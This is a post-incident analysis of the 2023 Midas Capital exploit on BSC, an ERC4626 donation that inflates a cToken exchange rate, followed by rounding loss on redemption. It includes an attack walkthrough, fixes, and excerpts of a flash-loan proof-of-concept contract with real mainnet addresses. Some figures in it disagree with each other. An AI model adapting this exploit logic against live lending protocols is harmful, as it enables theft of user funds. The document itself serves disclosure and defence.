# MidasCapital XYZ (BSC) — ERC4626 Inflation + Precision Loss Analysis

| Item | Details |
|------|------|
| **Date** | 2023-06-17 |
| **Protocol** | Midas Capital XYZ (BSC) — Ankr/Helio Isolated Pool |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~$600,000 (ANKR, ankrBNB, HAY/BUSD LP assets drained) |
| **Attacker** | [0x4b92cC34...470734](https://bscscan.com/address/0x4b92cC3452Ef1E37528470495B86d3F976470734) |
| **Attack Contract** | [0xC40119C7...c8Fde](https://bscscan.com/address/0xC40119C7269A5FA813d878BF83d14E3462fC8Fde) |
| **Attack Tx** | [0x4a304ff0...c3a6](https://bscscan.com/tx/0x4a304ff08851106691f626045b0f55d403e3a0958363bdf82b96e8ce7209c3a6) |
| **Vulnerable Contract** | [0xF8527Dc5...b25cB](https://bscscan.com/address/0xF8527Dc5611B589CbB365aCACaac0d1DC70b25cB) (fsAMM-HAY/BUSD cToken) |
| **Root Cause** | Empty Market + direct donation to ERC4626 Vault inflating exchangeRate → precision loss allows large LP redemption with fractional cTokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/MidasCapitalXYZ_exp.sol) |

---

## 1. Vulnerability Overview

Midas Capital is a lending protocol forked from Compound Finance V2, operating an isolated pool that accepted HAY/BUSD LP tokens as collateral. The core vulnerability arose from a combination of two issues.

**First**, an **Empty Market initialization vulnerability** existed whereby, when the cToken market was empty (totalSupply near 0), an attacker could manipulate the `exchangeRate` by leaving only a tiny amount of cTokens and redeeming the rest.

**Second**, directly calling `deposit()` on the **ERC4626 Vault (HAY_BUSDT_Vault)** wrapping the HAY/BUSD LP caused the `totalCash` of the `fsAMM_HAY_BUSD` cToken to increase while the cToken totalSupply remained unchanged, causing the `exchangeRate` to skyrocket exponentially.

When these two conditions combined, the `exchangeRate` rose from its initial value of `0.2 * 1e18` to `2.59e38` — approximately **1.3 × 10²¹ times** its original value. Subsequently, the `divScalarByExpTruncate()` function inside `redeemUnderlying()` truncates (floors) the result, meaning a **redemption request corresponding to 1.998 wei cTokens was rounded down to 1 wei cToken**, allowing 1 wei cToken to drain approximately 519,134 LP tokens (worth ~$519K).

This incident follows the same attack pattern as the **Hundred Finance hack (Optimism, $7M) in April 2023** and the **Sonne Finance hack (Optimism, $20M) in May 2024**.

---

## 2. Vulnerable Code Analysis

### 2.1 exchangeRate Calculation — Denominator Manipulation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — exchangeRateStored() in Compound V2 fork
function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        // When market is empty: return initial exchangeRate
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    } else {
        // ❌ Vulnerable point: totalCash can be directly manipulated externally
        // Direct donation to ERC4626 Vault increases totalCash (totalSupply unchanged)
        uint totalCash = getCashPrior();  // Actual token balance held (manipulable)
        uint cashPlusBorrowsMinusReserves;
        MathError mathErr;
        (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(
            totalCash, totalBorrows, totalReserves + totalFuseFees + totalAdminFees
        );
        // exchangeRate = (totalCash + borrows - reserves) / totalSupply
        // After attack: totalCash surges to 519,134 LP, totalSupply is only 1001 wei
        // → exchangeRate = ~519,134e18 / 1001 ≈ 5.18e35 (rises further via ERC4626 conversion)
        return (mathErr, cashPlusBorrowsMinusReserves / _totalSupply);
    }
}
```

**Problem**: `getCashPrior()` reads the balance of the ERC4626 Vault contract (`HAY_BUSDT_Vault`). An attacker can `deposit()` LP tokens directly into the Vault, increasing `totalCash` without triggering any cToken mint/redeem. When this manipulation occurs while `totalSupply` is only 1001 wei, `exchangeRate` rises to astronomical levels.

```solidity
// ✅ Fixed code — exchangeRate upper bound + donation attack defense
function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    } else {
        uint totalCash = getCashPrior();
        // ✅ Fix 1: Validate exchangeRate change upper bound
        // Set maximum allowed multiplier relative to previous exchangeRate (e.g., 2x)
        uint currentRate = totalCash / _totalSupply;
        require(
            currentRate <= lastExchangeRate * MAX_EXCHANGE_RATE_MULTIPLIER,
            "ExchangeRate manipulation detected"
        );
        // ...
    }
}

// ✅ Fix 2: Lock minimum liquidity on mint() (Empty Market prevention)
uint internal constant MINIMUM_LIQUIDITY = 1000; // Lock minimum 1000 wei
function mint(uint mintAmount) external returns (uint) {
    // On first mint, permanently lock MINIMUM_LIQUIDITY to address(0)
    if (totalSupply == 0) {
        _mint(address(0), MINIMUM_LIQUIDITY);
        mintAmount -= MINIMUM_LIQUIDITY;
    }
    // ...
}
```

---

### 2.2 Precision Loss in redeemUnderlying

```solidity
// ❌ Vulnerable code — cToken quantity calculation inside redeemFresh()
function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns (uint) {
    // redeemAmountIn = amount of underlying tokens to redeem
    // When calculating redeemTokensIn:
    //   redeemTokens = redeemAmountIn / exchangeRate
    //   = 519,134e18 / (259,307,483,413,976,717,546,872 * 1e15)
    //   ≈ 1.998 → truncate → 1 (wei)
    // ❌ LP equivalent to 1.998 wei cTokens can be redeemed by paying only 1 wei
    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});
    (mathErr, redeemTokens) = divScalarByExpTruncate(redeemAmountIn, exchangeRate);
    // divScalarByExpTruncate: floors the result → rounding favors attacker
}
```

```solidity
// ✅ Fixed code — change rounding direction to favor the protocol
function redeemFresh(...) internal returns (uint) {
    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});
    // ✅ Use ceiling (round up) instead of truncate: user must pay more cTokens
    (mathErr, redeemTokens) = divScalarByExpCeil(redeemAmountIn, exchangeRate);
    // 1.998 → ceil → 2 (wei): 2 wei cTokens required to redeem
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Before the attack, the attacker transferred 220,000 HAY tokens and 23,000 BUSDT tokens to the attack contract (simulated with `deal()` in the PoC)
- Deployed a Borrower sub-contract

### 3.2 Execution Phase (Single Transaction)

```
Step 1: Dual Flash Loan Acquisition
   PancakeSwap V2 (ankrBNB_ANKRV2)
   ──────────────────────────────────────
   Attack contract calls swap()
   → Receives flash loan of 3,743,005 ANKR tokens

   Algebra Pool V3 (ankrBNB_ANKRV3)
   ──────────────────────────────────────
   Forwards ANKR to Borrower contract, then
   → Receives additional flash loan of 30,751,081 ANKR tokens

Step 2: cToken Market Preparation (Empty Market Setup)
   HAY 20,000 + BUSDT 22,369 converted to HAY/BUSD LP
   → Receives 21,184.7314 LP tokens
   fsAMM_HAY_BUSD.mint(21,184 LP)
   → Receives 105,923 cTokens
   fsAMM_HAY_BUSD.redeem(105,923 - 1001)
   → Redeems 104,922 cTokens, retains only 1001 wei
   (totalSupply = 1001 wei)

Step 3: exchangeRate Inflation (Core Attack)
   Donate 21,184.7314 HAY/BUSD LP tokens
   directly to fsAMM_HAY_BUSD via HAY_BUSDT_Vault.deposit()
   ┌──────────────────────────────────────────────┐
   │  totalCash: 0 → increases by 21,184 LP       │
   │  totalSupply: 1001 wei (unchanged)            │
   │  exchangeRate: 2e17 → ~2.12e34 (skyrockets)  │
   └──────────────────────────────────────────────┘

Step 4: ANKR Collateral Supply + Borrowing
   Borrower.execute():
   - Supply 34,494,086 ANKR → fANKR market (as collateral)
   - Borrow 1,148.26 ankrBNB from fankrBNB
   - Borrow 25,296 HAY from fHAY
   - Transfer drained assets to attack contract

Step 5: Additional Large HAY/BUSD LP Acquisition + Second Donation
   Swap 1,032 ankrBNB → WBNB
   Swap WBNB → 260,151 BUSDT
   HAY 225,296 + BUSDT 251,989 → 238,641.8 LP tokens acquired
   HAY_BUSDT_Vault.deposit(238,641 LP) → donate to fsAMM_HAY_BUSD
   ┌──────────────────────────────────────────────┐
   │  exchangeRate: ~2.12e34 → 2.593e38 (surges again) │
   │  (1.3 × 10²¹ times initial value)            │
   └──────────────────────────────────────────────┘

Step 6: Precision Loss Exploitation — Large LP Redemption with Fractional cTokens
   Borrower.exit():
   - Transfer 1 wei cToken from attack contract to Borrower
   - Call redeemUnderlying(519,134 LP)
     → Required cTokens = 519,134e18 / exchangeRate
       = 519,134e18 / 2.593e38 ≈ 1.998 → truncate → 1 wei
   ┌──────────────────────────────────────────────┐
   │  1 wei cToken (≈ $0) successfully redeems    │
   │  519,134 LP tokens ($519K)!                  │
   └──────────────────────────────────────────────┘
   - Borrow additional ANKR and transfer everything to attack contract
   - Recover collateral via fANKR.redeem()

Step 7: Flash Loan Repayment and Cleanup
   Repay 30,836,384 ANKR → Algebra Pool V3 (+ fee)
   Repay  3,752,737 ANKR → PancakeSwap V2 (0.26% fee)
```

### 3.3 Attack Flow Diagram

```
  Attacker EOA
  0x4b92...
      │
      ▼
 ┌──────────────────────┐
 │  Attack Contract     │
 │  0xC40119C7...       │
 │  MidasXYZExploit     │
 └──────────┬───────────┘
            │ 1. PancakeSwap V2 flash loan
            ▼
 ┌──────────────────────┐     ┌──────────────────────┐
 │ ankrBNB_ANKRV2       │────▶│  3,743,005 ANKR      │
 │ PancakeSwap V2 Pool  │     │  received by attack   │
 └──────────────────────┘     └──────────┬───────────┘
                                          │ 2. Algebra V3 flash loan
                                          ▼
                              ┌──────────────────────┐
                              │ ankrBNB_ANKRV3       │
                              │ Algebra V3 Pool      │
                              │ +30,751,081 ANKR     │
                              └──────────┬───────────┘
                                          │ (inside Borrower contract)
                                          ▼
 ┌──────────────────────────────────────────────────────┐
 │  3. Empty Market Setup                               │
 │  HAY/BUSD LP 21,184 → fsAMM_HAY_BUSD.mint()         │
 │  → Receives 105,923 cTokens                          │
 │  fsAMM_HAY_BUSD.redeem(104,922)                     │
 │  → totalSupply = only 1001 wei remaining             │
 └──────────────────────────────┬───────────────────────┘
                                 │
                                 ▼
 ┌──────────────────────────────────────────────────────┐
 │  4. exchangeRate Inflation (Core)                    │
 │  HAY_BUSDT_Vault.deposit(21,184 LP → fsAMM_HAY_BUSD) │
 │  totalCash ↑↑  /  totalSupply = 1001 wei (fixed)    │
 │  exchangeRate: 2e17 → 2.593e38 (1.3×10²¹ x rise)   │
 └──────────────────────────────┬───────────────────────┘
                                 │
                                 ▼
 ┌──────────────────────────────────────────────────────┐
 │  5. Collateral Supply + Borrowing                    │
 │  34M ANKR → fANKR market supply (collateral)         │
 │  fankrBNB: borrow 1,148 ankrBNB ✓                   │
 │  fHAY: borrow 25,296 HAY ✓                          │
 └──────────────────────────────┬───────────────────────┘
                                 │
                                 ▼
 ┌──────────────────────────────────────────────────────┐
 │  6. Second Donation → Further exchangeRate Increase  │
 │  ankrBNB → WBNB → BUSD 260,151                      │
 │  HAY 225K + BUSD 251K → LP 238,641 additional donate │
 │  exchangeRate: → 2.593e38 (final value)              │
 └──────────────────────────────┬───────────────────────┘
                                 │
                                 ▼
 ┌──────────────────────────────────────────────────────┐
 │  7. Precision Loss Exploitation                      │
 │  redeemUnderlying(519,134 LP)                       │
 │  Required cTokens = 519,134e18 / 2.593e38           │
 │             = 1.998 wei → truncate → 1 wei           │
 │  ❌ 1 wei cToken ($0) drains 519,134 LP ($519K)     │
 └──────────────────────────────┬───────────────────────┘
                                 │
                                 ▼
                    ┌────────────────────┐
                    │  Flash Loan Repay  │
                    │  Return all ANKR   │
                    │  (+ fees)          │
                    └────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$600,000 (including ANKR, ankrBNB, HAY/BUSD LP)
  - Attack contract residual: 590,964 ANKR, 116 ankrBNB, 519.13 HAY/BUSD LP
- **Protocol loss**: fsAMM-HAY/BUSD isolated pool completely drained
- **Post-attack**: Attacker laundered approximately 510 BNB via Tornado Cash and bridged to Ethereum mainnet

---

## 4. PoC Code (Key Excerpts from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract MidasXYZExploit is Test {
    // === Core Contract Addresses ===
    ICErc20Delegate private constant fsAMM_HAY_BUSD =
        ICErc20Delegate(payable(0xF8527Dc5611B589CbB365aCACaac0d1DC70b25cB)); // Vulnerable cToken
    IHAY_BUSDT_Vault private constant HAY_BUSDT_Vault =
        IHAY_BUSDT_Vault(0x02706A482fc9f6B20238157B56763391a45bE60E); // ERC4626 Vault

    // PoC fork block number (immediately before attack)
    uint256 private constant blocknumToForkFrom = 29_185_768;

    function algebraFlashCallback(...) external {
        // [Step 1] Acquire LP tokens with HAY + BUSD, then supply to cToken market
        uint256 liquidityMinted = transferTokensAndMintLiqudity(20_000e18);
        HAY_BUSDT.approve(address(fsAMM_HAY_BUSD), type(uint256).max);
        fsAMM_HAY_BUSD.mint(liquidityMinted);

        // [Step 2] Redeem most cTokens → reduce totalSupply to 1001 wei
        fsAMM_HAY_BUSD.redeem(fsAMM_HAY_BUSD.balanceOf(address(this)) - 1001);

        // [Step 3] ❌ Direct LP donation to ERC4626 Vault → triggers exchangeRate inflation
        // Second argument (to) of HAY_BUSDT_Vault.deposit() set to fsAMM_HAY_BUSD
        // → cToken's totalCash increases, totalSupply unchanged
        HAY_BUSDT.approve(address(HAY_BUSDT_Vault), type(uint256).max);
        HAY_BUSDT_Vault.deposit(HAY_BUSDT.balanceOf(address(this)), address(fsAMM_HAY_BUSD));

        // [Step 4] Supply ANKR collateral + borrow ankrBNB/HAY via Borrower contract
        fsAMM_HAY_BUSD.transfer(address(borrower), 1001);
        borrower.execute(); // ANKR collateral → borrow ankrBNB + HAY

        // [Step 5] Convert borrowed ankrBNB → BUSD, then donate large LP amount
        // → exchangeRate rises to final value of 2.593e38
        liquidityMinted = transferTokensAndMintLiqudity(HAY.balanceOf(address(this)));
        HAY_BUSDT_Vault.deposit(liquidityMinted, address(fsAMM_HAY_BUSD)); // ❌ Second donation

        // [Step 6] ❌ Precision loss exploitation
        // borrower.exit() internally calls redeemUnderlying(519,134 LP)
        // → Required cTokens = 1.998 wei → truncate → 1 wei
        // → 1 wei cToken drains $519K worth of LP
        borrower.exit();

        // [Step 7] Flash loan repayment
        ANKR.transfer(address(ankrBNB_ANKRV3), flashRepayAmountV3 + fee1);
        ANKR.transfer(address(ankrBNB_ANKRV2), (flashRepayAmountV2 * 10_026) / 10_000);
    }
}

contract Borrower is Test {
    function exit() external {
        // ❌ Core: large LP redemption against manipulated exchangeRate
        // 1 wei cToken drains 519,134 LP tokens
        fsAMM_HAY_BUSD.transfer(msg.sender, 1);  // Send 1 wei cToken, redeem with remainder
        uint256 borrowAmount = fankrBNB.getCash();
        fankrBNB.borrow(borrowAmount);  // Additional ankrBNB borrow (undercollateralized)
        Unitroller.exitMarket(address(fANKR));
        // Borrow additional ANKR up to borrow limit
        borrowAmount = (686_000e18 - fANKR.totalBorrowsCurrent()) - 1;
        fANKR.borrow(borrowAmount);
        fANKR.redeem(fANKR.balanceOf(address(this)));  // Recover collateral
        // Transfer all assets to attack contract
        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));
        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | exchangeRate inflation via direct ERC4626 Vault donation | CRITICAL | CWE-682 | `16_accounting_sync.md` |
| V-02 | Empty Market precision loss (truncate rounding) | CRITICAL | CWE-190 | `05_integer_issues.md` |
| V-03 | Undercollateralized large-scale borrowing via Flash Loan | HIGH | CWE-841 | `02_flash_loan.md` |
| V-04 | Unprotected totalSupply minimum (allows reduction to 1001 wei) | HIGH | CWE-682 | `17_staking_reward.md` |

### V-01: exchangeRate Inflation via Direct ERC4626 Vault Donation

- **Description**: Calling `HAY_BUSDT_Vault.deposit(amount, address(fsAMM_HAY_BUSD))` causes the ERC4626 Vault to increase the Midas cToken contract's balance (`totalCash`). Since cToken `mint()` was not invoked, `totalSupply` does not change, causing `exchangeRate = totalCash / totalSupply` to rise exponentially.
- **Impact**: exchangeRate exceeds normal bounds, rising up to 1.3 × 10²¹ times; large underlying asset redemptions become possible with fractional cTokens
- **Attack Conditions**: cToken totalSupply must be at an extremely low value (1001 wei); the `to` parameter of the ERC4626 Vault must be unvalidated

### V-02: Empty Market Precision Loss

- **Description**: Compound V2's `divScalarByExpTruncate()` function floors (truncates) the division result. When `redeemAmountIn / exchangeRate` produces a fractional result under artificially inflated exchangeRate conditions, the required cToken amount is floored in a direction that favors the attacker. 1.998 wei becomes 1 wei, effectively allowing asset redemption at half the cost.
- **Impact**: Up to 2x the underlying asset amount can be drained per 1 wei cToken
- **Attack Conditions**: exchangeRate must be manipulated; rounding direction must be unfavorable to the protocol

### V-03: Undercollateralized Borrowing via Flash Loan

- **Description**: With collateral value artificially inflated by exchangeRate manipulation, the entire protocol liquidity (`getCash()`) is borrowed from fankrBNB and fHAY based on the manipulated collateral value
- **Impact**: 1,148 ankrBNB and 25,296 HAY borrowed without adequate collateral
- **Attack Conditions**: V-01 must precede this step

### V-04: Unprotected totalSupply Minimum

- **Description**: By calling `mint()` followed by `redeem()`, nearly all cTokens can be withdrawn, reducing totalSupply down to 1001 wei. Uniswap V2 prevents this by permanently burning `MINIMUM_LIQUIDITY (1000)` at the first LP issuance, but this protocol lacks that protection.
- **Impact**: Creates Empty Market state → prerequisite for chained V-01, V-02 attacks
- **Attack Conditions**: mint() access must be unrestricted

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Permanently lock minimum liquidity on mint() (Uniswap V2 approach)
uint internal constant MINIMUM_LIQUIDITY = 1000;

function mintFresh(address minter, uint mintAmount) internal returns (uint, uint) {
    // ...existing logic...
    if (totalSupply == 0) {
        // First supplier permanently locks MINIMUM_LIQUIDITY to address(1)
        // → totalSupply can never reach 0 or an extremely low value
        uint lockAmount = MINIMUM_LIQUIDITY;
        _mint(address(1), lockAmount);
        mintTokens -= lockAmount;
    }
    _mint(minter, mintTokens);
}

// ✅ Fix 2: Whitelist validation for ERC4626 Vault's to parameter
// HAY_BUSDT_Vault.sol
function deposit(uint256 amount, address to) external returns (uint256) {
    // ❌ Before: to could be set directly to the cToken contract
    // ✅ After: to must be a pre-registered user address
    require(allowedRecipients[to] || to == msg.sender, "Invalid recipient");
    // ...
}

// ✅ Fix 3: Change rounding direction in redeemFresh to favor the protocol
function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns (uint) {
    if (redeemAmountIn > 0) {
        Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});
        // ❌ Before: divScalarByExpTruncate (floor → favors attacker)
        // ✅ After: divScalarByExpCeil (ceiling → favors protocol)
        (mathErr, redeemTokens) = divScalarByExpCeil(redeemAmountIn, exchangeRate);
        require(redeemTokens > 0, "Zero cTokens for non-zero redeem");
    }
    // ...
}

// ✅ Fix 4: exchangeRate upper bound check (emergency circuit breaker)
uint internal constant MAX_EXCHANGE_RATE_MULTIPLIER = 2; // Max 2x change per block

function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    // ...
    uint newRate = cashPlusBorrowsMinusReserves / _totalSupply;
    // Revert if exchangeRate rises abnormally compared to previous value
    if (lastExchangeRate > 0) {
        require(newRate <= lastExchangeRate * MAX_EXCHANGE_RATE_MULTIPLIER,
            "Exchange rate manipulation detected");
    }
    return (MathError.NO_ERROR, newRate);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: ERC4626 donation attack | Restrict Vault's `deposit(to)` parameter to a whitelist; disallow cToken contract addresses as `to` |
| V-02: Precision loss | Standardize all division operations to round in the protocol's favor (use ceiling) |
| V-03: Undercollateralized borrowing | Use pre-transaction snapshot values for collateral valuation within flash loan blocks |
| V-04: Empty Market | Apply Uniswap V2's `MINIMUM_LIQUIDITY` pattern — permanently lock 1000 units on first issuance |
| General: Compound forks | Mandatory comprehensive review of ERC4626 integration vulnerabilities before launching any Compound V2 fork |

---

## 7. Lessons Learned

1. **Compound V2 forks require additional scrutiny when integrating ERC4626**: The original cToken design assumed underlying tokens could not be transferred directly. When combined with an interface like an ERC4626 Vault — which allows assets to be sent to arbitrary addresses via a `to` parameter — the attack surface for donation attacks expands dramatically.

2. **Empty Markets are the highest-risk state**: When cToken totalSupply approaches 0, the exchangeRate becomes extremely easy to manipulate. Uniswap V2's `MINIMUM_LIQUIDITY` permanent-lock pattern is simple but serves as a critical defense that blocks this entire class of attacks. It should be applied to all share-based protocols.

3. **Rounding direction must always favor the protocol**: In DeFi, all division operations should be implemented to round slightly in the protocol's favor (ceiling). Using truncation (floor) that favors users can turn fractional differences into precision-loss attacks. This principle is explicitly stated in the [ERC-4626 security considerations](https://eips.ethereum.org/EIPS/eip-4626).

4. **The same vulnerability pattern keeps recurring**: This attack uses virtually the same mechanism as Hundred Finance (2023-04, Optimism, $7M), Sonne Finance (2024-05, Optimism, $20M), and Radiant Capital (2024-01, Arbitrum, $4.5M). A process of testing against already-published PoCs for identical attack patterns is necessary before launching any new protocol.

5. **Isolated pools are still a protocol-wide risk**: Security reviews must not be neglected simply because a pool is "small and isolated." The direct loss in this attack was $340K, but the attacker also drained ANKR/HAY liquidity from other pools in a cascading fashion, bringing the total damage to $600K.

---

## 8. On-Chain Verification

On-chain data was queried directly using the Foundry `cast` tool to cross-validate the PoC analysis results.

### 8.1 Transaction Basic Information

| Item | Value |
|------|-----|
| Attack Tx Hash | `0x4a304ff08851106691f626045b0f55d403e3a0958363bdf82b96e8ce7209c3a6` |
| Attacker (from) | `0x4b92cC3452Ef1E37528470495B86d3F976470734` ✓ (matches PoC) |
| Attack Contract (to) | `0xC40119C7269A5FA813d878BF83d14E3462fC8Fde` ✓ (matches PoC) |
| Block Number | 29,185,769 (PoC forked from 29,185,768, immediately next block) ✓ |
| gasUsed | 12,894,662 (very high — reflects complex multi-call) |
| Status | 0x1 (success) |

### 8.2 PoC vs On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan ANKR V2 | `ankrBNB_ANKRV2.balanceOf - 1` | 3,743,005 ANKR | ✓ |
| Flash loan ANKR V3 | `ankrBNB_ANKRV3.balanceOf` | 30,751,081 ANKR | ✓ |
| Initial HAY supply (deal) | 220,000 HAY | 220,000 HAY (Transfer log) | ✓ |
| cToken retained balance | 1,001 wei | 1,001 wei | ✓ |
| Donated LP (1st) | ~21,184 LP | 21,184.7314 LP | ✓ |
| Donated LP (2nd) | Remaining HAY in full | 238,641.8861 LP | ✓ |
| Drained LP | 519,134 LP (~$519K) | 519,134.1009 LP | ✓ |
| exchangeRate pre-attack | 2e17 (initial value 0.2) | 200,000,000,000,000,000 (= 2e17) | ✓ |
| exchangeRate post-attack | — | 259,307,483,413,976,717,546,872,000,000,000,000,000 (≈ 2.593e38) | — |
| exchangeRate increase factor | Theoretical 1.3e21 | 1.297e21 times | ✓ |

### 8.3 On-Chain Event Log Sequence (Key flows from 53 Transfer events)

```
① ANKR: ankrBNB_ANKRV2 → AttackC  (3,743,005 ANKR flash loan)
② ANKR: ankrBNB_ANKRV3 → Borrower (30,751,081 ANKR flash loan)
③ HAY/BUSD LP: 0x0 → AttackC      (21,184 LP mint)
④ HAY/BUSD LP: AttackC → Vault    (1st donation — exchangeRate inflation)
⑤ fANKR(cToken): 0x13ae... → Borrower (ANKR collateral supply)
⑥ ankrBNB: fankrBNB → Borrower    (1,148 ankrBNB borrow)
⑦ HAY: fHAY → Borrower            (25,296 HAY borrow)
⑧ WBNB: Algebra → AttackC         (ankrBNB swap)
⑨ BUSD: PancakeV3 → AttackC       (WBNB→BUSD 260,151 swap)
⑩ HAY/BUSD LP: 0x0 → AttackC      (238,641 LP mint — 2nd donation)
⑪ HAY/BUSD LP: 0x02706... → AttackC (519,134 LP redemption ← core precision loss)
⑫ ANKR: AttackC → ankrBNB_ANKRV3  (30,836,384 ANKR repaid)
⑬ ANKR: AttackC → ankrBNB_ANKRV2  (3,752,737 ANKR repaid)
```

### 8.4 Precondition Verification (at attack block 29,185,768)

| Condition | Value | Meaning |
|------|-----|------|
| fsAMM_HAY_BUSD.totalSupply() | **0** | Market is completely empty |
| fsAMM_HAY_BUSD.getCash() | **0** | No deposited assets |
| fsAMM_HAY_BUSD.exchangeRateStored() | **2e17** | Initial exchangeRate (0.2) |

- The vulnerable market was completely empty before the attack — optimal conditions for an Empty Market attack
- Confirmed that the exchangeRate was at its initial value, indicating no prior users; the attack occurred immediately after market creation with no existing victims

---

*Analysis date: 2026-04-11 | Tools: Foundry cast, DeFiHackLabs PoC, BscScan*